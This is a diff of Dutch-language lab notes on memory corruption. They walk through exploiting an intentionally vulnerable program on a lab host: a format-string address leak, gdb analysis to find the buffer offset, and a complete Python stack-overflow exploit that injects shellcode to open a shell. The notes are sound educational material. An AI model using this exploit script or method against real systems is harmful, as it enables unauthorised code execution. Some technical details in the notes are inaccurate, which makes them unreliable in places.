@@ -1,0 +1,370 @@
+=== Protostar
+Dit is een vulnerable machine van exploit excersizes die basic memory
+corruption issues behandelt.
+
+
+=== malloc
+memory allocation.
+
+*mmap* gives a process memory. System calls directly to the kernel.
+*brk* can change the memory amount that is already used.
+
+*malloc* is a wrapper that handles brk or mmap. It also manages and organises
+the memory.
+
+the heap is the big junk of fixed mapped memory. Je kan hier alles in doen wat
+je wil.
+
+malloc(8) reserveer 8 bytes aan memory.
+
+Geheugen wordt gereserveerd en een adres wordt toegekend samen met de lengte
+van het gereserveerde geheugen. Daarmee kan bepaald worden waar het volgende
+vrije stuk geheugen is.
+
+Dit kun je ook gebruiken om de grootte van een chunk data te bepalen. Als je
+het adres hebt van het begin van een stuk data dan weet je dat net daarvoor een
+entry staat met de grootte van de chunk. 
+
+Op een 32 bits machine zijn deze blokken allemaal 4 bytes. de free doet ook mee
+in de chunk size notatie en is ook 4 bytes. Dus als je 8 bytes data laat
+reserveren door malloc dan komt komt bij de grootte: de 2 blokken van 4 bytes,
+de free (4bytes) en de 4 bytes van waar de grootte informatie in komt te staan
+(4 bytes) in totaal dus 16 bytes (0x10). Malloc geeft dan het adres waar de
+data begint terug (bijvoorbeeld 0x804a00). Nu kun je uitrekenen: Het
+eerstvolgende vrije blok is 0x804a00 + 0x10 = 0x804a10. Het geheugen adres waar
+de grootte staat is 0x804a00 - 0x4 = 0x8049fc
+
+=== gcc
+
+gcc is een compiler voor c. Dit is ook onderdeel van de kali distributie.
+Clone de repository. Compileer het c programma:
+----
+#Op de remote server 10.2.10.9
+gcc caf.c -o caf -fno-stack-protector -z execstack -no-pie
+----
+gets function slaat een ingegeven regel en slaat die op in een string.
+
+=== socat
+
+Socat is onderdeel van de kali distributie. + Met socat verbinden we naar de
+ubuntu server waar het caf programma is gecompileerd. Je kunt met socat een
+poort openzetten die een programma uitvoert op het moment dat je ermee verbindt.
+
+----
+#op 10.2.10.9:
+socat TCP-LISTEN:1337,nodelay,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 ./caf"
+----
+
+=== netcat (nc)
+
+Tool om te connecten op een poort.
+
+----
+nc 10.2.10.9 1337
+C Application Firewall Test - please try a payload:
+%p %p %p
+0x1 0x7ffff1a0fab9 0x7f1a71c21aa0
+----
+
+Wat we hier testen en gebruiken is een format string vulnerability. In de code
+is dit het printf(buf) statement. Als je format strings ingeeft errort de
+applicatie hierop. Hij geeft dan niet de echo van de format string terug, maar
+stuurt een geheugenadres terug.
+
+=== ASLR
+
+Randomizatie van plekken in geheugen waar programma's starten. Dit is gedaan om
+het moeilijker te maken te raden waar een volgend stuk code in het geheugen
+start.
+
+=== Finding memory addresses
+
+Op de server (je moet dus wel eerst een sessie hebben op de server om deze exploit te
+kunnen schrijven).
+
+Gebruik cat /proc/<pid>/maps dit geeft de memory mapping.
+Zoek naar een adres op de stack. dit ligt ergens tussen het start en eind adres
+in. 
+
+Zoek de adressen van de format strings op in /proc. Zoek eerst het procesnummer
+op van nc en de executable. Kijk welke adressen uit de output van nc in de stack zitten.
+
+----
+ps aux | grep caf
+root      105751  0.0  0.0   2664  1008 pts/2    SN   19:19   0:00 ./caf
+
+sudo cat /proc/105751/maps
+7ffff19f1000-7ffff1a12000 rwxp 00000000 00:00 0                          [stack]
+----
+
+0x7ffff1a0fab9 zit bij mij in de stack. Het eerste en derde geheugen adres niet.
+Dus dit geheugenadres is interessant. 
+
+=== Verschil tussen stack en heap
+
+de stack is ook geheugen maar gestackt. Als een stapel boeken. Je kan er iets
+bovenopleggen, en verwijderen. Als er iets bovenopgelegd is kun je wat daaronder
+zit niet meer aanspreken. De stack bevat functies en methoden uit een programma
+die hun taak uitvoeren en daarna verdwijnen.  Variabelen in functies zitten dan
+ook vaak in de stack. Als de functie is uitgevoerd verdwijnen de variabelen
+weer. Global variabeles zitten in de heap.
+
+=== gdb
+
+gdb = debugger
+sudo gdb -p <procesID>
+gdb is geen onderdeel van kali. Installeer met apt.
+
+kijk nu of je op die geheugenpositie iets herkenbaars vindt.
+
+----
+sudo gdb -p 105037
+x/16gx 0x7ffdb8c2e349 #16gx is the output formatter for 64bits.
+----
+
+Dit levert eigenlijk niks zichtbaars op waar je iets van kan maken.
+Het adres wijst wel naar iets wat belangrijk is. Daarom gaan we het programma
+analyseren. 
+_bt_ binnen gdb is _backtrace_ oftewel de backtrace van de hele stack.
+Je ziet daar hoe het programma de verschillende functies aanroept. Een van die
+functies is CAFtest(). Deze kun je zichtbaar maken met het commando
+_disassemble_ in gdb.
+
+----
+disassemble CAFtest
+----
+
+Daarna zet je een breakpoint op een interessant stuk waarvan je wil weten wat er
+op dat moment in het geheugen gebeurt en hoe dat er daar uitziet. Een breakpoint
+stopt het programma op het punt waar je de break maakt en laat dan het geheugen
+zien. We maken een breakpoint bij de return van de functie printf.
+
+----
+   0x0000000000401384 <+384>:   call   0x401080 <printf@plt>
+   0x0000000000401389 <+389>:   nop
+   0x000000000040138a <+390>:   leave  
+   0x000000000040138b <+391>:   ret    
+End of assembler dump.
+(gdb) break *0x000000000040138b
+Breakpoint 1 at 0x40138b
+(gdb) c
+----
+
+Om wat meer duidelijkheid te krijgen in wat er gebeurt voegen we een aantal
+tekens toe die we zouden kunnen herkennen in het geheugen. Als input gebruiken
+we bijvoorbeeld:
+
+XXXXXXXXXXXXXXXXXXXX %p %p %p YYYYYYYYYYYYYYYYYYYYYYYYYYYYY
+
+Misschien kunnen we kijken of we deze karakters tegenkomen zodat we beter kunnen
+duiden wat het adres betekent dat we terugkrijgen op de %p tekens.
+
+----
+#Client
+C Application Firewall Test - please try a payload:
+XXXXXXXXX %p %p %p YYYYYYYY
+XXXXXXXXX 0x1 0x7ffc588eb27c 0x7f2463de2aa0 YYYYYYYY
+
+#Server
+(gdb) x/64gx 0x7ffc588eb27c
+0x7ffc588eb27c: 0x0000000000000000      0x0000000000000000
+0x7ffc588eb28c: 0x0000000000000000      0x0000000000000000
+0x7ffc588eb29c: 0x0000000000000000      0x0000000000000000
+0x7ffc588eb2ac: 0x0000000000000000      0x0000000000000000
+0x7ffc588eb2bc: 0x0000000000000000      0x0000000000000000
+0x7ffc588eb2cc: 0x0000000000000000      0x0000000000000000
+----
+
+Dit zegt nog steeds niet zoveel. Het helpt om dan een stukje terug te gaan in het
+geheugen om te kijken of er iets voor staat dat helpt.
+
+----
+(gdb) x/64gx 0x7ffc588eb27c-32
+0x7ffc588eb25c: 0x5858585800000000      0x7025205858585858
+0x7ffc588eb26c: 0x5920702520702520      0x0059595959595959
+0x7ffc588eb27c: 0x0000000000000000      0x0000000000000000
+0x7ffc588eb28c: 0x0000000000000000      0x0000000000000000
+----
+
+Nu zien we de Y's staan precies voor het adres dat we terugkregen. Een stukje
+verder terug zien we ook de X-en staan met iets er tussenin. Blijbaar is het
+adres dat we terugkrijgen het einde van de input. Omdat te testen maken we de
+volgende string: +
+%p,%p,%p
+
+Dit zijn precies 8 karakters van 1 byte. Dus als we dit opsturen en we lezen
+vervolgens vanaf het geheugenadres dat we krijgen na de stringfout - 8 bytes
+moeten we onze string terugvinden:
+
+----
+C Application Firewall Test - please try a payload:
+%p,%p,%p
+0x1,0x7ffc588eb269,0x7f2463de2aa0
+
+#server
+Breakpoint 1, 0x000000000040138b in CAFtest ()
+(gdb) x/64gx 0x7ffc588eb269-8
+0x7ffc588eb261: 0x0070252c70252c70      0x0000000000000000
+0x7ffc588eb271: 0x0000000000000000      0x0000000000000000
+0x7ffc588eb281: 0x0000000000000000      0x0000000000000000
+----
+
+In geheugen adres 0x7ffc588eb261 (0x7ffc588eb269-8) staat de waarde
+0x0070252c70252c70. We kunnen gdb gebruiken om hier ASCII van te maken door het
+x/s commando te gebruiken.
+
+----
+(gdb) x/s 0x7ffc588eb261
+0x7ffc588eb261: "p,%p,%p"
+----
+
+We zijn het null byte aan het einde vergeten dus het komt erop neer dat je -9
+bytes moet doen, maar de theorie klopt. Hiermee kunnen we dus doormiddel van de
+string fault vulnerability achter het startadres komen van deze functie.
+
+Het doel is om shell code toe te voegen. Hiervoor moeten we nu de volgende stap
+gaan zetten. Dat is de buffer overflow vulnerability uitbuiten. De
+vulnerability is dat als je meer data schrijft in de input string dan er
+geheugen is gereserveerd de applicatie een segmentation fault geeft. Je overschrijft
+dan data in het return address. Daar errort de applicatie op. Als we uit kunnen
+vinden waar dat return address zicht bevindt dan kunnen we daar een valide ander
+adres neerzetten. Op dat adres zetten we dan de shellcode neer. Dit is
+logischerwijs het volgende adres omdat we alles in de buffer plaatsen.
+
+=== RIP
+De RIP is de instruction pointer in de stack. In de RIP staat het adres dat de
+CPU zojuist heeft ingeladen en momenteel aan het uitvoeren is. Bij het uitvoeren
+van de functie reserveert malloc een stuk geheugen. Dit is fixed. Aan het einde
+van dat geheugen staat dan het return adres. Dit wordt aan het einde van de
+functie door RIP gelezen. Bij een bufffer overflow overschrijf je deze return
+pointer met data. Dat geeft een segmentation fault.
+
+De kunst bij het schrijven van een buffer overflow exploit is dat je uitzoekt
+waar de return pointer staat en dat je daar een waarde inzet met de locatie van
+de shellcode. Omdat je de shellcode onmiddellijk achter dit adres zet maak je
+een RIP die naar het volgende adres wijst.
+
+Naast de RIP zijn er nog 2 andere belangrijke registers: de RBP en de RSP. De
+RSP is de stack pointer. Hij is verantwoordelijk voor het bijhouden van
+beschikbare posities in de stack queue (LIFO). De RSB is de base pointer. Deze
+wijst naar het _stack frame_. Dit is het gedeelte van de stack dat op dit moment
+actief is, of waar de functie die op dit moment wordt uitgevoerd staat.
+
+Om het return address te vinden gaan we uitzoeken hoeveel data we in de buffer
+kunnen zetten voordat hij een error geeft. Als we dat weten, weten we namelijk
+het adres van het return address. Om dat te vinden maken we een random string en
+voeren die in de applicatie in. Met behulp van het break point kunnen we precies
+terugzoeken bij welk karakter de error optrad.
+
+We nemen bijvoorbeeld de volgende string: +
+
+----
+C Application Firewall Test - please try a payload:
+asdfkjhadskfjhklajfhjbvq9w847ry230945ybvlkwjfehvadsflkiihjao4c3i28n098tvcun098tucvnr049f8un3d21098cunr4098cvufn4320opijr4nvc0-98t5ujnmv098t5vu,ct-05.ic-0.it2-0c8xum098tcuyn209348tucn203984tcvun234098ctum203984ctu,2-03c,x2-0398uc,20983vtun23098vut230984vurtn2309r8uc1mr-4098u,24-098tcux2.-8uc,12c098tu2vm304t98vu23n4c098u,2-0tx4-0328c9xu,m23098vumt20984ux,2-3048cu23-0c9u8,i2-09tv8cum
+
+#server
+
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040138b in CAFtest ()
+
+----
+
+We zien op welk geheugen adres de crash plaatsvond. Deze kunnen we uitlezen en
+zichtbaar maken:
+
+----
+(gdb) x/5gx $rip
+0x40138b <CAFtest+391>: 0x894855fa1e0ff3c3      0xfc7d8910ec8348e5
+0x40139b <main+15>:     0x000000b8f0758948      0xf4ebfffffe5be800
+0x4013ab:       0xec8348fa1e0ff300
+
+(gdb) x/5gx $rsp
+0x7fffa4640a18: 0x3930342d726d3163      0x39302d34322c7538
+0x7fffa4640a28: 0x2d2e327875637438      0x306332312c637538
+0x7fffa4640a38: 0x336d763275743839
+
+(gdb) x/s 0x7fffa4640a18
+0x7fffa4640a18: "c1mr-4098u,24-098tcux2.-8uc,12c098tu2vm304t98vu23n4c098u,2-0tx4-0328c9xu,m23098vumt20984ux,2-3048cu23-0c9u8,i2-09tv8cum"
+(gdb)
+
+----
+
+_x/5gx $rip_ laat zien dat hij inderdaad gecrasht is door een overflow op het
+return adres.
+
+_x/5gx $rsp_ laat zien waar de top of de stack op dat moment is. Deze is gevuld
+met een foute waarde, namelijk een deel van de string. Precies dat deel die in
+het return adres is gekomen. Vanaf dit punt is de buffer dus overschreven. Als
+we dat gedeelte van de string terugvinden en alles vanaf dat punt verwijderen
+houden we precies de lengte van de buffer over.
+
+_x/s 0x7fffa4640a18_ Output de ascii waarde van de inhoud van dit adres. Dit
+levert een gedeelte van de string op.
+
+Nu verwijderen we dat stuk uit de string en houden dan de volgende _padding_
+over:
+
+----
+asdfkjhadskfjhklajfhjbvq9w847ry230945ybvlkwjfehvadsflkiihjao4c3i28n098tvcun098tucvnr049f8un3d21098cunr4098cvufn4320opijr4nvc0-98t5ujnmv098t5vu,ct-05.ic-0.it2-0c8xum098tcuyn209348tucn203984tcvun234098ctum203984ctu,2-03c,x2-0398uc,20983vtun23098vut230984vurtn2309r8u
+----
+
+Dit zijn 264 characters en dit is dan dus ook de lengte van de buffer.
+
+=== Payload
+
+De code die je in het geheugen wil zetten is wat je achter het return adres gaat
+zetten. Dus het format voor de payload is dan:
+
+padding (de buffer) + RIP (overschrijf het return adres met het eerstvolgende
+adres waar de shellcode staat) + shellcode.
+
+RIP is dan het adres waar de shellcode staat . Het is de start van de buffer +
+de lengte van de padding + 8 bytes (het RIP adres zelf).
+
+Met deze informatie kun je nu een python script maken die een stuk shellcode
+uitvoert. 
+
+----
+import struct
+import socket
+
+s = socket.socket()
+s.connect(('10.2.10.9', 1337))
+r = s.recv(1024)
+s.send("%p,%p,%p\n")
+while ',' not in r:
+    r = s.recv(1024)
+start_buf = int(r.split(',')[1], 16)-9 #pak het tweede adres, dat is het adres
+in de stack
+print("leaked start of buffer: 0x{:08x}".format(start_buf))
+
+raw_input('EXPLOIT?')
+padding =
+"asdfkjhadskfjhklajfhjbvq9w847ry230945ybvlkwjfehvadsflkiihjao4c3i28n098tvcun098tucvnr049f8un3d21098cunr4098cvufn4320opijr4nvc0-98t5ujnmv098t5vu,ct-05.ic-0.it2-0c8xum098tcuyn209348tucn203984tcvun234098ctum203984ctu,2-03c,x2-0398uc,20983vtun23098vut230984vurtn2309r8u"
+
+shellcode = "\xcc"*64 #testcode to trigger a breakpoint
+#shellcode =
+"\x90\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
+# get this from shell-storm.org
+RIP = struct.pack("Q", (start_buf+len(padding)+8))
+payload = padding + RIP + shellcode
+s.send(payload)
+
+from telnetlib import Telnet
+t = Telnet()
+t.sock = s
+t.interact()
+s.close()
+
+----
+
+In eerste instantie kun je debuggen met gdb en de shellcode "\xcc"*64 dat 64
+keer cc in hex uitschrijft. Op het moment dat het script start wacht hij tot de
+user enter geeft. Dit geeft je tijd om op de server even het PID op te zoeken en
+gdb te starten. Daarna kun je hem laten doorgaan en zie je een Trace/Breakpoint
+trap. Als je dan zoekt op de $pid dan zie je dat deze is gevuld met cc. Dit
+betekent dat het werkt. Vervang nu deze code met de /bin/bash shellcode die van
+shellstorm is gehaald en doen de exploit nog een keertje.
